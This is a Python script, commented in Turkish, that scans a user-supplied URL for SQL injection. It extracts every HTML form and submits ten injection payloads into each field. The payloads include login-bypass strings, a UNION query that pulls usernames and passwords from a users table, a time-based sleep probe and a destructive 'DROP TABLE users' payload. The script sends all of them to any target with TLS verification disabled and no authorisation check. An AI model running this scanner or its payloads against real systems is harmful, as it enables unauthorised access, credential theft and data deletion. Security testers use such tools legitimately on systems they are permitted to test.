import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter("ignore", InsecureRequestWarning)

SQL_PAYLOADS = [
    ("' OR '1'='1", "Her zaman doğru olan koşul. Kimlik doğrulamasını atlamak için."),
    ("' OR 1=1 --", "Her zaman doğru olan koşul ve devamını yorum satırı yapar."),
    ("' OR '1'='1' --", "SQL sorgusunun kalanını iptal eder. Giriş kontrolünü atlatabilir."),
    ("' OR '1'='1' /*", "Yorum bloğuyla devam eden SQL manipülasyonu."),
    ("' OR 1=1#", "MySQL yorum işareti ile SQL atlaması."),
    ("' OR 'a'='a", "Mantıksal olarak doğru bir ifade. Filtreleri test etmek için."),
    ("'; DROP TABLE users; --", "Tehlikeli: Kullanıcılar tablosunu silmeye çalışır."),
    ("' AND 1=0 UNION SELECT username, password FROM users --", "Veritabanından veri sızdırmak için UNION kullanımı."),
    ("' AND 1=1", "Doğru koşul ile test. Genellikle Blind SQL için."),
    ("' OR sleep(5)--", "Zaman tabanlı Blind SQL Injection testi."),
]

def run_sql_test(url):
    results = []
    results.append("------------------------------------------------------")
    results.append("[=] SQL Injection testi başlatılıyor...")
    results.append("------------------------------------------------------")

    try:
        response = requests.get(url, verify=False, timeout=10)
        forms = extract_forms(response.text)
        results.append(f"[+] {len(forms)} form bulundu.")

        for i, form in enumerate(forms, 1):
            results.append(f"\n--- Form {i} Bilgisi ---")
            results.append(f"ACTION: {form['action']}")
            results.append(f"METHOD: {form['method'].upper()}")
            results.append(f"INPUT SAYISI: {len(form['inputs'])}")
            results.append(f"INPUT İSİMLERİ: {', '.join(form['inputs']) if form['inputs'] else 'YOK'}")

            for payload, description in SQL_PAYLOADS:
                data = {field: payload for field in form['inputs']}
                target = urljoin(url, form['action'])

                try:
                    if form['method'] == 'post':
                        resp = requests.post(target, data=data, verify=False, timeout=10)
                    else:
                        resp = requests.get(target, params=data, verify=False, timeout=10)

                    content_length = len(resp.text)
                    status_code = resp.status_code
                    error_keywords = ["sql", "syntax", "query", "mysql", "warning", "ora-", "postgres"]

                    if any(err in resp.text.lower() for err in error_keywords):
                        results.append(f"[!] SQL Injection tespit edildi!")
                        results.append(f"    ↳ Payload: {payload}")
                        results.append(f"    ↳ Açıklama: {description}")
                        results.append(f"    ↳ Yanıt uzunluğu: {content_length} | HTTP Durumu: {status_code}")
                    else:
                        results.append(f"[-] Denenen payload: {payload} → Güvenli görünmekte.")
                except Exception as ex:
                    results.append(f"[X] Payload '{payload}' gönderilirken hata: {ex}")

    except Exception as e:
        results.append(f"[X] Sayfa analizi sırasında hata oluştu: {e}")

    results.append("------------------------------------------------------")
    results.append("[=] SQL Injection testi tamamlandı. Bir sonraki zafiyet taramasına geçiliyor...")
    results.append("------------------------------------------------------")
    return "\n".join(results)

def extract_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = [inp.attrs.get("name", "test") for inp in form.find_all("input") if inp.attrs.get("type") != "submit"]
        forms.append({"action": action, "method": method, "inputs": inputs})
    return forms

if __name__ == "__main__":
    hedef_url = input("Test edilecek URL: ")
    print(run_sql_test(hedef_url))